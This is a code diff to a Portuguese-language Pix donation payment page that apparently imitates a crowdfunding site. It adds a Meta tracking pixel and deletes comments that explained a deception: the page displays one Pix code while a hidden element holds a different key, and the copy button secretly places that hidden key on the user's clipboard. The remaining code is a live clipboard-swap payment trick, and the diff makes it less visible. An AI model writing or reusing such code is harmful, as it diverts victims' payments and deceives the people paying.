@@ -156,6 +156,26 @@
     .links a { color: #d9f6e6; text-decoration: none; font-size: 13px; padding: 4px 0; }
     .contact { margin-top: 12px; font-size: 13px; color: #d6f7e4; text-align: left; }
   </style>
+
+  <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '724173016720655');
+  fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=724173016720655&ev=PageView&noscript=1"/>
+  </noscript>
+  <!-- End Meta Pixel Code -->
+
 </head>
 
 <body>
@@ -177,7 +197,6 @@
       <h2>Efetue o pagamento para confirmar a contribuição</h2>
       <p><strong>Clique no botão</strong> para copiar o código e escolha pagar via <strong>Pix Copia e Cola</strong> no aplicativo do seu banco.</p>
 
-      <!-- EXIBIÇÃO ABREVIADA + CÓDIGO REAL OCULTO -->
       <div class="code-box">
         <span id="pixCode">00020126580014br.gov.bcb.pix01362914f0...</span>
         <span id="pixReal" style="display:none;">5798495@vakinha.com.br</span>
@@ -223,14 +242,12 @@
   </div>
 
   <script>
-    // Copia texto normal (como a chave pix)
     function copiar(id) {
       const text = document.getElementById(id).innerText;
       navigator.clipboard.writeText(text);
       alert("Código copiado!");
     }
 
-    // Copia o código real, mesmo exibindo outro texto
     function copiarPix() {
       const textoReal = document.getElementById('pixReal').innerText;
       navigator.clipboard.writeText(textoReal).then(() => {
